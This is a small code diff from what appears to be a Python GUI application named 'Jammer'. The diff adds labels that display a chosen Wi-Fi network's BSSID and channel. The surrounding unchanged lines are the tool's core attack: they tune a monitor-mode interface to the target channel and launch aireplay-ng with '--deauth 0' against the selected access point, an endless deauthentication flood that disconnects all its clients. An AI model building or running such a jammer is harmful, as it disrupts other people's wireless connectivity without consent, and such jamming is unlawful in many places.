@@ -134,8 +134,10 @@ class Jammer(QMainWindow):
         current_essid = self.ui.comboBox_2.currentText()
         current_essid_index = self.ui.comboBox_2.currentIndex()
         self.retrive_info(0)
+        self.ui.bssid_label.setText("BSSID: " + self.bssid[current_essid_index])
         current_bssid = self.bssid[current_essid_index]
         self.retrive_info(3)
+        self.ui.channel_label.setText("Channel: " + self.channel[current_essid_index])
         current_channel = self.channel[current_essid_index]
         subprocess.run(['iwconfig', self.wireless_interface_mon, 'channel', current_channel])
         self.process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
